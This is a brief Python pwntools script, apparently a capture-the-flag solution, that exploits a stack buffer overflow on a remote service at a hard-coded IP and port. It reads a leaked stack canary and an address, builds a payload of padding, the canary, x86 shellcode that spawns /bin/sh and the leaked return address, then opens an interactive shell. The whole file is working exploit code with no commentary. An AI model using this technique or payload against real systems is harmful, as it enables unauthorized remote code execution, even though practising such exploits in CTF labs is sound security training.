import pwn
from pwn import *

r = remote("3.238.30.178",3003)
canary = r.recv(150) [-10:]
canary = int(canary, base=16)
leak = r.recv(73) [-10:]
leak = int(leak, base=16)

shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
payload = b""
payload = b"A"*20
payload += p32(canary)
payload += shellcode
payload += b"A"*7
payload += p32(leak)
r.sendline(payload)
r.interactive()
